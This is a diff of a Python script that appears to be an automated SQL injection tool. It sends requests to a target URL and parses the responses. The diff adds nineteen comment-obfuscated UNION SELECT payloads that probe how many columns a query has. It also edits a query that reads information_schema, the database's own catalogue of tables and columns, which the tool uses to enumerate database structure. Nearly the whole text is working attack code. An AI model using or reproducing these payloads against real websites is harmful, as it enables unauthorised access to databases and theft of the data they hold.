@@ -1,4 +1,4 @@
-# Update
+# update new v1.1
 import requests 
 import datetime
 import time
@@ -8,7 +8,6 @@ import os
 from colorama import Fore
 from colorama import Style
 from bs4 import BeautifulSoup
-from lxml import etree
 
 colorama.init()
 
@@ -37,6 +36,25 @@ check_vuln = [
     '**%27',
 ]
 payloads = [
+    '/**8**/UNION/**8**/SELECT/**8**/1,2--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
     '/**8**/UNION SELECT ALL 1,2',
     '/**8**/UNION SELECT ALL 1,2,3',
     '/**8**/UNION SELECT ALL 1,2,3,4',
@@ -237,7 +255,7 @@ if URL_TARGET:
 
                             if args.col:
                                 query = payload_2.replace("2", "column_name")
-                                payload_6 = f"{query} From information_schema.columns"
+                                payload_6 = f"{query} From information_schema.tables"
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                 result_6 = requests.get(URL_TARGET, payload_6)
                                 if "The used SELECT" in result_6:
